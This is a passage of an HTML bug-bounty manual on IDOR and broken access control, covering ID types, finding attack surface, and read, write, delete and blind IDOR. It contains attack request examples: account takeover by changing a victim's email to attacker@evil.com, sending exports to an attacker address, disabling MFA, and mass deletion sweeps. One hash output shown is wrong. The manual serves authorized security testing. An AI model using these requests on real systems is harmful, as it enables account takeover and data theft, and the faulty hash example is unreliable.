@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IDOR: The Complete Field Manual</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700;900&display=swap');
+  :root {
+    --bg:#080c10;--surface:#0c1118;--card:#101620;--border:#182030;
+    --accent:#38bdf8;--accent2:#fb923c;--accent3:#4ade80;--warn:#fbbf24;
+    --red:#f87171;--purple:#c084fc;--text:#e2e8f0;--muted:#4b5a6e;--code-bg:#060a0f;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-size:15px;line-height:1.75}
+  #cover{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:60px 24px;background:radial-gradient(ellipse 80% 50% at 50% -5%,rgba(56,189,248,.10) 0%,transparent 70%),radial-gradient(ellipse 60% 40% at 85% 90%,rgba(251,146,60,.07) 0%,transparent 70%),var(--bg);position:relative;overflow:hidden}
+  #cover::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.013) 40px),repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(255,255,255,.013) 40px);pointer-events:none}
+  .cover-label{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.25em;text-transform:uppercase;color:var(--accent);margin-bottom:24px;border:1px solid rgba(56,189,248,.35);padding:6px 18px;border-radius:2px}
+  .cover-title{font-size:clamp(44px,9vw,96px);font-weight:900;line-height:1;letter-spacing:-3px;color:#fff;margin-bottom:8px}
+  .cover-title span{color:var(--accent)}
+  .cover-sub{font-size:clamp(16px,2.5vw,22px);font-weight:300;color:var(--muted);margin-top:12px;margin-bottom:40px}
+  .cover-stats{display:flex;gap:40px;justify-content:center;flex-wrap:wrap;margin-bottom:52px}
+  .stat{text-align:center}.stat .n{font-size:30px;font-weight:900;color:var(--accent3);font-family:'JetBrains Mono',monospace}.stat .l{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-top:2px}
+  .toc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;max-width:1000px;width:100%;text-align:left}
+  .toc-item{background:var(--surface);border:1px solid var(--border);padding:14px 18px;border-radius:6px;text-decoration:none;display:block;transition:border-color .2s,background .2s}
+  .toc-item:hover{border-color:var(--accent);background:var(--card)}
+  .toc-item .ch{font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--accent);letter-spacing:.15em;text-transform:uppercase;margin-bottom:4px}
+  .toc-item .tt{font-size:13px;font-weight:600;color:var(--text)}
+  .nav-bar{position:sticky;top:0;z-index:100;background:rgba(8,12,16,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 24px;display:flex;align-items:center;gap:18px;overflow-x:auto;height:48px}
+  .nav-bar a{font-size:11px;text-decoration:none;color:var(--muted);white-space:nowrap;padding:4px 0;border-bottom:2px solid transparent;transition:color .2s,border-color .2s;font-family:'JetBrains Mono',monospace}
+  .nav-bar a:hover{color:var(--accent);border-bottom-color:var(--accent)}
+  .nav-logo{font-weight:900;color:#fff;font-size:13px;margin-right:8px;white-space:nowrap}
+  main{max-width:920px;margin:0 auto;padding:48px 24px 120px}
+  .chapter-header{margin:80px 0 40px;padding:40px;background:linear-gradient(135deg,var(--surface) 0%,var(--card) 100%);border:1px solid var(--border);border-left:4px solid var(--accent);border-radius:8px;position:relative;overflow:hidden}
+  .chapter-header::after{content:attr(data-ch);position:absolute;right:24px;top:16px;font-size:80px;font-weight:900;color:rgba(255,255,255,.025);font-family:'JetBrains Mono',monospace;line-height:1}
+  .chapter-header .ch-label{font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:10px}
+  .chapter-header h2{font-size:clamp(22px,4vw,36px);font-weight:900;color:#fff;letter-spacing:-1px}
+  .chapter-header p{color:var(--muted);margin-top:10px;font-size:14px}
+  h3{font-size:20px;font-weight:700;color:#fff;margin:48px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+  h4{font-size:15px;font-weight:600;color:var(--accent);margin:28px 0 10px}
+  p{color:var(--text);margin-bottom:14px}
+  ul,ol{margin:0 0 14px 22px;color:var(--text)}
+  ul li,ol li{margin:6px 0}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:20px;overflow-x:auto;margin:16px 0 24px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.7;color:#e2e8f0}
+  pre .c{color:var(--muted);font-style:italic}
+  pre .kw{color:var(--accent)}
+  pre .st{color:var(--accent3)}
+  pre .ok{color:#4ade80}
+  pre .bad{color:var(--red)}
+  pre .cp{color:var(--warn)}
+  code{font-family:'JetBrains Mono',monospace;font-size:12px;background:var(--card);border:1px solid var(--border);padding:2px 6px;border-radius:3px;color:var(--accent3)}
+  .info-box{border:1px solid;border-radius:6px;padding:18px 20px;margin:20px 0}
+  .info-box.tip{border-color:rgba(56,189,248,.4);background:rgba(56,189,248,.05)}
+  .info-box.warn{border-color:rgba(251,191,36,.4);background:rgba(251,191,36,.05)}
+  .info-box.danger{border-color:rgba(248,113,113,.4);background:rgba(248,113,113,.05)}
+  .info-box.bounty{border-color:rgba(74,222,128,.4);background:rgba(74,222,128,.05)}
+  .info-box .box-title{font-size:11px;text-transform:uppercase;letter-spacing:.15em;font-weight:700;margin-bottom:8px;font-family:'JetBrains Mono',monospace}
+  .info-box.tip .box-title{color:var(--accent)}
+  .info-box.warn .box-title{color:var(--warn)}
+  .info-box.danger .box-title{color:var(--red)}
+  .info-box.bounty .box-title{color:var(--accent3)}
+  .report-card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:24px;margin:24px 0;border-left:4px solid var(--accent3)}
+  .report-card .r-header{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:14px}
+  .report-card .r-company{font-weight:700;font-size:16px;color:#fff}
+  .report-card .r-bounty{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:17px;color:var(--accent3);background:rgba(74,222,128,.1);border:1px solid rgba(74,222,128,.3);padding:4px 12px;border-radius:4px}
+  .r-badge{font-size:10px;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.1em;padding:3px 8px;border-radius:3px;font-weight:700;display:inline-block;margin-right:6px;margin-bottom:8px}
+  .r-critical{background:rgba(248,113,113,.2);color:var(--red);border:1px solid rgba(248,113,113,.3)}
+  .r-high{background:rgba(251,191,36,.2);color:var(--warn);border:1px solid rgba(251,191,36,.3)}
+  .r-medium{background:rgba(56,189,248,.2);color:var(--accent);border:1px solid rgba(56,189,248,.3)}
+  .data-table{width:100%;border-collapse:collapse;margin:16px 0 24px}
+  .data-table th{background:var(--card);color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.1em;padding:10px 14px;text-align:left;border-bottom:1px solid var(--border);font-family:'JetBrains Mono',monospace}
+  .data-table td{padding:10px 14px;border-bottom:1px solid rgba(24,32,48,.7);font-size:13px;vertical-align:top}
+  .data-table tr:hover td{background:rgba(255,255,255,.02)}
+  .data-table td:first-child{font-family:'JetBrains Mono',monospace;color:var(--accent3);font-size:12px}
+  .flow{display:flex;flex-direction:column;margin:24px 0}
+  .flow-step{display:flex;align-items:flex-start;gap:16px;padding:16px 0;border-left:2px solid var(--border);padding-left:24px;position:relative}
+  .flow-step::before{content:'';position:absolute;left:-7px;top:22px;width:12px;height:12px;background:var(--accent);border-radius:50%}
+  .flow-step.ok::before{background:var(--accent3)}
+  .flow-step.bad::before{background:var(--red)}
+  .flow-num{min-width:28px;height:28px;background:var(--card);border:1px solid var(--border);border-radius:4px;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;color:var(--accent)}
+  .flow-text strong{display:block;color:#fff;font-size:14px;margin-bottom:4px}
+  .flow-text span{color:var(--muted);font-size:13px}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:20px 0}
+  .method-card{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:18px}
+  .method-card .m-icon{font-size:22px;margin-bottom:8px}
+  .method-card .m-title{font-weight:700;color:#fff;margin-bottom:6px}
+  .method-card .m-desc{font-size:13px;color:var(--muted)}
+  .phase{background:linear-gradient(90deg,rgba(56,189,248,.1) 0%,transparent 100%);border:1px solid rgba(56,189,248,.22);border-radius:4px;padding:12px 18px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);text-transform:uppercase;letter-spacing:.15em;margin:32px 0 16px}
+  .wordlist{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px;margin:14px 0}
+  .wordlist code{display:block;border-radius:2px}
+  hr{border:none;border-top:1px solid var(--border);margin:48px 0}
+  ::-webkit-scrollbar{width:6px;height:6px}
+  ::-webkit-scrollbar-track{background:var(--bg)}
+  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+  @media(max-width:640px){.chapter-header{padding:24px}.cover-stats{gap:20px}}
+</style>
+</head>
+<body>
+
+<section id="cover">
+  <div class="cover-label">Field Manual · Bug Bounty Edition · 2025–2026</div>
+  <h1 class="cover-title"><span>IDOR</span> COMPLETE</h1>
+  <p class="cover-sub">Insecure Direct Object Reference — From ID Tampering to Mass Account Takeover</p>
+  <div class="cover-stats">
+    <div class="stat"><div class="n">12</div><div class="l">Chapters</div></div>
+    <div class="stat"><div class="n">$20K</div><div class="l">Highest Known Payout</div></div>
+    <div class="stat"><div class="n">#1</div><div class="l">OWASP Broken Access Control</div></div>
+    <div class="stat"><div class="n">$14,333</div><div class="l">Avg Critical Bounty</div></div>
+    <div class="stat"><div class="n">10</div><div class="l">Real Reports</div></div>
+  </div>
+  <div class="toc-grid">
+    <a class="toc-item" href="#ch1"><div class="ch">Chapter 1</div><div class="tt">IDOR Fundamentals & Threat Model</div></a>
+    <a class="toc-item" href="#ch2"><div class="ch">Chapter 2</div><div class="tt">Types of Object References</div></a>
+    <a class="toc-item" href="#ch3"><div class="ch">Chapter 3</div><div class="tt">Finding the Attack Surface</div></a>
+    <a class="toc-item" href="#ch4"><div class="ch">Chapter 4</div><div class="tt">Read-Based IDOR</div></a>
+    <a class="toc-item" href="#ch5"><div class="ch">Chapter 5</div><div class="tt">Write & Delete IDOR</div></a>
+    <a class="toc-item" href="#ch6"><div class="ch">Chapter 6</div><div class="tt">Blind IDOR & Indirect Leakage</div></a>
+    <a class="toc-item" href="#ch7"><div class="ch">Chapter 7</div><div class="tt">BOLA in REST & GraphQL APIs</div></a>
+    <a class="toc-item" href="#ch8"><div class="ch">Chapter 8</div><div class="tt">Bypassing ID Protections</div></a>
+    <a class="toc-item" href="#ch9"><div class="ch">Chapter 9</div><div class="tt">Chaining IDOR for Critical Impact</div></a>
+    <a class="toc-item" href="#ch10"><div class="ch">Chapter 10</div><div class="tt">Real-World Bug Reports</div></a>
+    <a class="toc-item" href="#ch11"><div class="ch">Chapter 11</div><div class="tt">Complete Testing Checklist</div></a>
+    <a class="toc-item" href="#ch12"><div class="ch">Chapter 12</div><div class="tt">Methodology, Tools & Reports</div></a>
+  </div>
+</section>
+
+<nav class="nav-bar">
+  <span class="nav-logo">IDOR MANUAL</span>
+  <a href="#ch1">Fundamentals</a><a href="#ch2">ID Types</a><a href="#ch3">Surface</a>
+  <a href="#ch4">Read IDOR</a><a href="#ch5">Write/Delete</a><a href="#ch6">Blind</a>
+  <a href="#ch7">BOLA/GraphQL</a><a href="#ch8">Bypasses</a><a href="#ch9">Chaining</a>
+  <a href="#ch10">Reports</a><a href="#ch11">Checklist</a><a href="#ch12">Methodology</a>
+</nav>
+
+<main>
+
+<!-- CH1 -->
+<section id="ch1">
+  <div class="chapter-header" data-ch="01">
+    <div class="ch-label">Chapter 01</div>
+    <h2>IDOR Fundamentals &amp; Threat Model</h2>
+    <p>The simplest concept in web security. The most persistently rewarding bug class. One missing authorization check, unlimited victims.</p>
+  </div>
+
+  <h3>1.1 What IDOR Actually Is</h3>
+  <p>Insecure Direct Object Reference (IDOR) is a subset of <strong>Broken Access Control</strong> — the #1 vulnerability in OWASP Top 10. It occurs when an application exposes a direct reference to an internal object (a database record, file, user account, order, or message) and then fails to verify whether the requesting user actually has permission to access that specific object.</p>
+  <p>The server asks the wrong question. It asks: <em>"Is this user logged in?"</em> — but never asks: <em>"Does this user own this resource?"</em> The gap between those two questions is the entire IDOR vulnerability class.</p>
+
+  <div class="info-box danger">
+    <div class="box-title">⚡ The One-Line Definition</div>
+    <p>You change someone else's ID in a request, the server returns their data. That's IDOR.</p>
+    <p style="margin-top:10px"><code>GET /api/invoice?id=<span style="color:var(--red)">1024</span></code> → your invoice<br>
+    <code>GET /api/invoice?id=<span style="color:var(--accent3)">1023</span></code> → someone else's invoice (IDOR)</p>
+  </div>
+
+  <h3>1.2 Why IDOR Is So Common and So Dangerous</h3>
+  <p>Analysis of 250 disclosed IDOR reports on HackerOne spanning 2017–2025 reveals that <strong>36.4% of IDOR reports are rated High or Critical</strong>. The average critical-severity IDOR bounty is <strong>$14,333</strong>. Individual reports have reached <strong>$20,000</strong>. Total disclosed bounties exceeded $129,000 — and that's only the public subset.</p>
+  <p>IDOR persists because:</p>
+  <ul>
+    <li>Authorization is checked at login but often not re-checked on every resource access</li>
+    <li>Frontend-only enforcement (JavaScript hides the button but the API still responds)</li>
+    <li>Microservices add endpoints that each independently fail to recheck authorization</li>
+    <li>Mobile apps expose API endpoints the web interface never shows</li>
+    <li>Legacy "zombie" API endpoints lose access control during refactors</li>
+    <li>Developers confuse authentication ("who are you?") with authorization ("what can you do?")</li>
+  </ul>
+
+  <h3>1.3 IDOR Impact Scale</h3>
+  <table class="data-table">
+    <tr><th>Severity</th><th>What You Can Do</th><th>Typical Bounty</th></tr>
+    <tr><td>Low / Info</td><td>Read non-sensitive data (public profile extra fields, metadata)</td><td>$0–$300</td></tr>
+    <tr><td>Medium</td><td>Read PII (name, email, phone) of other users</td><td>$300–$1,500</td></tr>
+    <tr><td>High</td><td>Read financial data, private messages, medical records</td><td>$1,500–$5,000</td></tr>
+    <tr><td>Critical</td><td>Write/delete operations, ATO, mass user data, admin access</td><td>$5,000–$20,000+</td></tr>
+  </table>
+
+  <h3>1.4 Full IDOR/BOLA Taxonomy</h3>
+  <table class="data-table">
+    <tr><th>Type</th><th>Description</th><th>Example</th></tr>
+    <tr><td>Direct Object IDOR</td><td>Change an ID → access another object</td><td><code>/invoice?id=1023</code></td></tr>
+    <tr><td>Action-Level IDOR</td><td>Access an action without the required role</td><td><code>DELETE /api/user/99</code> as regular user</td></tr>
+    <tr><td>Function-Level IDOR</td><td>Reach a function meant for privileged roles only</td><td><code>/admin/reports</code> as regular user</td></tr>
+    <tr><td>Indirect IDOR</td><td>Object reference hidden in body or headers</td><td>JSON: <code>{"user_id": 1234}</code></td></tr>
+    <tr><td>Blind IDOR</td><td>No response visible — data sent elsewhere</td><td>Receipt emailed to victim instead of attacker</td></tr>
+    <tr><td>Second-Order IDOR</td><td>ID stored, used later in background processing</td><td>Async export job uses stored ID</td></tr>
+  </table>
+</section>
+
+<!-- CH2 -->
+<section id="ch2">
+  <div class="chapter-header" data-ch="02">
+    <div class="ch-label">Chapter 02</div>
+    <h2>Types of Object References — Know What You're Hunting</h2>
+    <p>IDs come in many forms. Sequential integers are obvious. UUIDs, hashes, and encoded values require more technique — but are just as exploitable.</p>
+  </div>
+
+  <h3>2.1 Sequential Integer IDs</h3>
+  <p>The classic IDOR. Database auto-increment IDs — 1, 2, 3, 4… Trivially enumerable. Still account for <strong>36.9% of confirmed BOLA cases</strong> in modern 2023–2026 disclosures from mature security programs.</p>
+  <pre><span class="c"># Classic sequential IDOR:</span>
+GET /api/users/<span class="bad">1234</span>/profile   → Your profile
+GET /api/users/<span class="bad">1233</span>/profile   → Someone else's ← IDOR
+
+GET /invoice?id=<span class="bad">10240</span>
+GET /invoice?id=<span class="bad">10239</span>        ← Previous invoice (IDOR)
+
+<span class="c"># Burp Intruder enumeration:</span>
+<span class="c"># Payload: Numbers, From: TARGET-100, To: TARGET+100, Step: 1</span>
+<span class="c"># Filter: Status 200, or Response Length different from empty response</span></pre>
+
+  <h3>2.2 UUIDs — Not as Safe as Developers Think</h3>
+  <p>UUID v1 encodes a timestamp and MAC address — mathematically predictable. UUID v4 is random and cannot be guessed — but can still <em>leak</em> from other endpoints, and leaked UUIDs enable targeted IDOR.</p>
+  <pre><span class="c"># UUID v1 = time-based (predictable):</span>
+xxxxxxxx-xxxx-<span class="bad">1</span>xxx-yxxx-xxxxxxxxxxxx
+
+<span class="c"># UUID v4 = random (not guessable, but leaks through):</span>
+xxxxxxxx-xxxx-<span class="bad">4</span>xxx-yxxx-xxxxxxxxxxxx
+
+<span class="c"># Where UUIDs leak — always check these:</span>
+<span class="c"># - Shared resource URLs ("view this document")</span>
+<span class="c"># - API responses listing other users you interact with</span>
+<span class="c"># - Email notifications ("User uuid-xxxx viewed your file")</span>
+<span class="c"># - Error messages ("Access denied for resource uuid-xxxx")</span>
+<span class="c"># - GraphQL global IDs in responses</span>
+<span class="c"># - CSV/export files containing all user IDs</span>
+<span class="c"># - Search API results</span>
+
+<span class="c"># GraphQL global IDs — base64 encoded Type:ID:</span>
+VXNlcjoxMjM0  →  base64 decode  →  User:1234
+<span class="c"># Modify: User:1233 → base64 encode → VXNlcjoxMjMz  ← use in next query</span></pre>
+
+  <h3>2.3 Encoded / Hashed References</h3>
+  <pre><span class="c"># Base64 — trivially reversible:</span>
+dXNlcl8xMjM0  →  decode  →  user_1234
+<span class="c"># Increment: user_1233 → encode → dXNlcl8xMjMz  ← new IDOR payload</span>
+echo -n "user_1233" | base64
+<span class="ok">→ dXNlcl8xMjMz</span>
+
+<span class="c"># MD5 of predictable values (email → ID):</span>
+echo -n "victim@email.com" | md5sum
+<span class="ok">→ 5d41402abc4b2a76b9719d911017c592</span>
+<span class="c"># If ID = MD5(email), know the email → know the ID → IDOR</span></pre>
+
+  <h3>2.4 Non-ID Object References to Test</h3>
+  <div class="wordlist">
+    <code>filename=</code><code>file=</code><code>document=</code><code>path=</code>
+    <code>report_name=</code><code>template=</code><code>account_number=</code>
+    <code>email=</code><code>username=</code><code>phone=</code><code>token=</code>
+    <code>slug=</code><code>reference=</code><code>invoice_ref=</code>
+    <code>order_number=</code><code>ticket_id=</code><code>receipt_id=</code>
+    <code>session_id=</code><code>batch_id=</code><code>export_id=</code>
+  </div>
+</section>
+
+<!-- CH3 -->
+<section id="ch3">
+  <div class="chapter-header" data-ch="03">
+    <div class="ch-label">Chapter 03</div>
+    <h2>Finding the Attack Surface</h2>
+    <p>IDOR is everywhere — but you need to know exactly where to look.</p>
+  </div>
+
+  <h3>3.1 Feature-Level Targets</h3>
+  <div class="method-grid">
+    <div class="method-card"><div class="m-icon">👤</div><div class="m-title">User Profiles</div><div class="m-desc"><code>/api/users/1234</code> — read PII, email, phone, addresses. Write-based IDOR can change victim's profile.</div></div>
+    <div class="method-card"><div class="m-icon">📦</div><div class="m-title">Orders & Invoices</div><div class="m-desc"><code>/orders/5001</code> — access purchase history, shipping addresses, partial card numbers.</div></div>
+    <div class="method-card"><div class="m-icon">💬</div><div class="m-title">Messages & Tickets</div><div class="m-desc"><code>/messages/thread/8899</code> — read private conversations, support ticket history.</div></div>
+    <div class="method-card"><div class="m-icon">📄</div><div class="m-title">Documents & Files</div><div class="m-desc"><code>/files/download?id=abc</code> — private contracts, medical records, tax forms.</div></div>
+    <div class="method-card"><div class="m-icon">💳</div><div class="m-title">Payments & Transactions</div><div class="m-desc"><code>/transactions/9001</code> — highest sensitivity: bank accounts, card data, amounts.</div></div>
+    <div class="method-card"><div class="m-icon">🔑</div><div class="m-title">Password Reset / MFA</div><div class="m-desc"><code>/api/mfa/disable?user_id=1234</code> — IDOR here = direct account takeover.</div></div>
+    <div class="method-card"><div class="m-icon">📊</div><div class="m-title">Reports & Exports</div><div class="m-desc">Async CSV/PDF export jobs get an export_id — try adjacent IDs for other users' data exports.</div></div>
+    <div class="method-card"><div class="m-icon">🔔</div><div class="m-title">Notifications</div><div class="m-desc"><code>/notifications/mark-read?id=5432</code> — reveals another user received a notification.</div></div>
+  </div>
+
+  <h3>3.2 API Endpoint Discovery</h3>
+  <pre><span class="c"># 1. Intercept mobile app traffic (highest IDOR density):</span>
+<span class="c">#    Burp + Android emulator or iOS — every API call is a test candidate</span>
+
+<span class="c"># 2. Extract endpoints from JS bundles:</span>
+curl -s https://target.com/static/app.js | grep -oP '"(/api/v[0-9]+/[a-z0-9/_-]+)"' | sort -u
+
+<span class="c"># 3. Historical endpoints via gau:</span>
+gau target.com | grep "=" | grep -v ".png\|.jpg\|.css" | sort -u > api_endpoints.txt
+
+<span class="c"># 4. Find hidden parameters with Arjun:</span>
+arjun -u https://target.com/api/user --get
+arjun -u https://target.com/api/user --post
+
+<span class="c"># 5. API documentation leaks:</span>
+https://target.com/swagger.json
+https://target.com/api-docs
+https://target.com/openapi.yaml</pre>
+
+  <h3>3.3 The Two-Account Testing Setup</h3>
+  <div class="flow">
+    <div class="flow-step"><div class="flow-num">1</div><div class="flow-text"><strong>Create two test accounts (A = attacker, B = victim)</strong><span>Both must have real data — orders, messages, files, profiles.</span></div></div>
+    <div class="flow-step"><div class="flow-num">2</div><div class="flow-text"><strong>Log in as B, collect every object ID</strong><span>Write down all IDs: user_id, order_id, document_id, thread_id from every request.</span></div></div>
+    <div class="flow-step"><div class="flow-num">3</div><div class="flow-text"><strong>Log in as A, replay B's requests</strong><span>Use A's session token but B's object IDs. Every endpoint A reaches with B's IDs is a potential IDOR.</span></div></div>
+    <div class="flow-step ok"><div class="flow-num">4</div><div class="flow-text"><strong>Compare — if you get B's data → confirmed IDOR</strong><span>Document the full request/response pair with both accounts clearly identified.</span></div></div>
+  </div>
+
+  <div class="info-box tip">
+    <div class="box-title">💡 Automate with Autorize (Burp Extension)</div>
+    <p>Install Autorize from the BApp Store. Paste B's session cookie into the Autorize panel. Browse as A normally. Autorize replays every request with B's cookie and flags matches. Green = same response with B's auth = potential IDOR. This catches IDORs you'd miss manually across hundreds of endpoints.</p>
+  </div>
+</section>
+
+<!-- CH4 -->
+<section id="ch4">
+  <div class="chapter-header" data-ch="04">
+    <div class="ch-label">Chapter 04</div>
+    <h2>Read-Based IDOR</h2>
+    <p>Accessing data you should never see. The most common IDOR type.</p>
+  </div>
+
+  <h3>4.1 URL Path & Query Parameter IDOR</h3>
+  <pre><span class="c"># URL path IDOR:</span>
+GET /api/v1/user/<span class="bad">1233</span>/profile HTTP/1.1
+Authorization: Bearer ATTACKER_TOKEN
+<span class="c"># → Returns victim's name, email, phone, address</span>
+
+<span class="c"># Query parameter IDOR:</span>
+GET /api/documents?user_id=<span class="bad">VICTIM_ID</span>&format=json HTTP/1.1
+Authorization: Bearer ATTACKER_TOKEN
+
+<span class="c"># File-based IDOR:</span>
+GET /uploads/<span class="bad">user1233</span>-invoice.pdf HTTP/1.1
+GET /exports/<span class="bad">account-5678</span>-statement.csv HTTP/1.1</pre>
+
+  <h3>4.2 IDOR in Request Bodies</h3>
+  <pre><span class="c"># JSON body IDOR — extremely common in modern APIs:</span>
+POST /api/documents/view HTTP/1.1
+Content-Type: application/json
+
+{"document_id": "<span class="bad">VICTIM_DOC_ID</span>", "user_id": "<span class="bad">VICTIM_USER_ID</span>"}
+
+<span class="c"># Form-encoded body:</span>
+POST /api/get_receipt HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+receipt_id=<span class="bad">2983</span>&user_id=<span class="bad">456</span></pre>
+
+  <h3>4.3 IDOR in HTTP Headers</h3>
+  <pre><span class="c"># Try adding these headers — some backends use them for routing:</span>
+X-Account-ID: <span class="bad">VICTIM_ACCOUNT</span>
+X-User-ID: <span class="bad">VICTIM_ID</span>
+X-Organization-ID: <span class="bad">OTHER_ORG</span>
+X-Tenant-ID: <span class="bad">VICTIM_TENANT</span>
+
+<span class="c"># Also try undocumented headers that bypass access control:</span>
+X-Original-User: admin
+X-Forwarded-User: admin
+X-Authenticated-User: admin@company.com</pre>
+
+  <h3>4.4 IDOR via Leaked IDs in API Responses</h3>
+  <pre><span class="c"># API leaks other users' IDs in normal responses:</span>
+GET /api/posts/MY_POST/likes
+<span class="ok">→ [{"user_id": 1001, "name": "Alice"}, {"user_id": 1002}]</span>
+
+<span class="c"># Now use leaked IDs in IDOR attacks:</span>
+GET /api/users/<span class="bad">1001</span>/private-messages   ← IDOR using leaked ID
+
+<span class="c"># Search API leaks IDs:</span>
+GET /api/search?q=john
+<span class="ok">→ [{"user_id": 5000, "name": "John Doe"}]</span>
+GET /api/users/<span class="bad">5000</span>/invoices   ← IDOR using search-leaked ID</pre>
+</section>
+
+<!-- CH5 -->
+<section id="ch5">
+  <div class="chapter-header" data-ch="05">
+    <div class="ch-label">Chapter 05</div>
+    <h2>Write &amp; Delete IDOR — The Critical-Severity Upgrades</h2>
+    <p>Write and delete operations are always rated higher. This is where you move from "information disclosure" to "account takeover."</p>
+  </div>
+
+  <h3>5.1 Write-Based IDOR → Account Takeover</h3>
+  <pre><span class="c"># Change victim's email (leads to ATO via password reset):</span>
+PUT /api/users/<span class="bad">VICTIM_ID</span>/profile HTTP/1.1
+Authorization: Bearer ATTACKER_TOKEN
+{"email": "attacker@evil.com"}
+<span class="c"># → Now trigger password reset to attacker@evil.com → full ATO</span>
+
+<span class="c"># Change victim's password directly:</span>
+POST /api/account/change-password
+{"user_id": "<span class="bad">VICTIM_ID</span>", "new_password": "hacked123"}
+
+<span class="c"># Disable victim's MFA:</span>
+PUT /api/users/<span class="bad">VICTIM_ID</span>/mfa
+{"mfa_enabled": false}
+
+<span class="c"># Fraudulent subscription for free:</span>
+POST /api/subscription/upgrade
+{"account_id": "<span class="bad">VICTIM_ACCOUNT</span>", "plan": "enterprise", "price": "0.00"}</pre>
+
+  <h3>5.2 Delete-Based IDOR</h3>
+  <pre><span class="c"># Delete another user's files:</span>
+DELETE /api/files/<span class="bad">VICTIM_FILE_ID</span> HTTP/1.1
+Authorization: Bearer ATTACKER_TOKEN
+
+<span class="c"># Mass deletion via Burp Intruder sweep:</span>
+DELETE /api/documents/<span class="bad">§1§</span> HTTP/1.1
+<span class="c"># Payload: 1001 to 2000 → 1000 users' documents deleted</span></pre>
+
+  <h3>5.3 HTTP Method Switching — Critical Bypass Technique</h3>
+  <pre><span class="c"># Authorization enforced inconsistently per HTTP method:</span>
+GET /uploads/<span class="bad">user1233</span>-photo.jpg   →  403 Forbidden
+DELETE /uploads/<span class="bad">user1233</span>-photo.jpg →  200 OK ← deletes their photo!
+PUT /uploads/<span class="bad">user1233</span>-photo.jpg    →  200 OK ← overwrites their photo!
+HEAD /uploads/<span class="bad">user1233</span>-photo.jpg   →  200 OK ← confirms existence
+
+<span class="c"># API version method inconsistency:</span>
+POST /api/v2/documents/<span class="bad">VICTIM_ID</span>  →  403 (new, protected)
+GET  /api/v1/documents/<span class="bad">VICTIM_ID</span>  →  200 (old, unprotected) ← IDOR</pre>
+
+  <h3>5.4 Privilege Escalation via Write IDOR</h3>
+  <pre><span class="c"># Invite yourself as admin to another organization:</span>
+POST /api/organization/<span class="bad">OTHER_ORG_UUID</span>/invite
+{"user_id": "ATTACKER_ID", "role": "admin"}
+<span class="c"># Using another org's UUID you're not a member of → join as admin</span>
+
+<span class="c"># Mass assignment — add privileged fields to profile update:</span>
+PUT /api/users/MY_ID/profile
+{"name": "test", "<span class="bad">is_admin</span>": true, "<span class="bad">role</span>": "admin", "<span class="bad">balance</span>": 99999}</pre>
+</section>
+
+<!-- CH6 -->
+<section id="ch6">
+  <div class="chapter-header" data-ch="06">
+    <div class="ch-label">Chapter 06</div>
+    <h2>Blind IDOR &amp; Indirect Leakage</h2>
+    <p>No data returned — but you still win. Detect via status codes, timing, email side effects, and out-of-band signals.</p>
+  </div>
+
+  <h3>6.1 Status Code Oracle</h3>
+  <pre><span class="c"># Even without response data, status codes reveal resource existence:</span>
+GET /api/user/<span class="bad">1000</span>  →  404  (no user — doesn't exist)
+GET /api/user/<span class="bad">1001</span>  →  403  (user exists — access denied = information disclosure)
+GET /api/user/<span class="bad">1002</span>  →  200  (full IDOR — user exists AND data returned)
+
+<span class="c"># Burp Intruder: sweep range, filter by status → 403s = valid IDs</span></pre>
+
+  <h3>6.2 Email-Based Blind IDOR</h3>
+  <pre><span class="c"># Trigger action that sends data to victim's email:</span>
+POST /api/receipts/resend
+{"receipt_id": <span class="bad">2983</span>}
+<span class="c"># → Receipt emailed to victim — you confirmed receipt 2983 exists</span>
+
+<span class="c"># Redirect export to attacker's email:</span>
+POST /api/account/export
+{"user_id": "<span class="bad">VICTIM_ID</span>", "delivery_email": "attacker@evil.com"}
+<span class="c"># → If email field not validated → victim's data sent to attacker</span></pre>
+
+  <h3>6.3 Timing-Based Blind IDOR</h3>
+  <pre><span class="c"># Database query time differs for found vs not-found:</span>
+GET /api/documents/<span class="bad">99999</span>  →  Response: 50ms   (not found — exits fast)
+GET /api/documents/<span class="bad">10001</span>  →  Response: 300ms  (found — DB query + filter)
+
+<span class="c"># Sort Intruder results by "Response Received" column
+# Slower responses = valid IDs even when all return the same status code</span></pre>
+</section>
+
+<!-- CH7 -->
+<section id="ch7">
+  <div class="chapter-header" data-ch="07">
+    <div class="ch-label">Chapter 07</div>
+    <h2>BOLA in REST &amp; GraphQL APIs</h2>
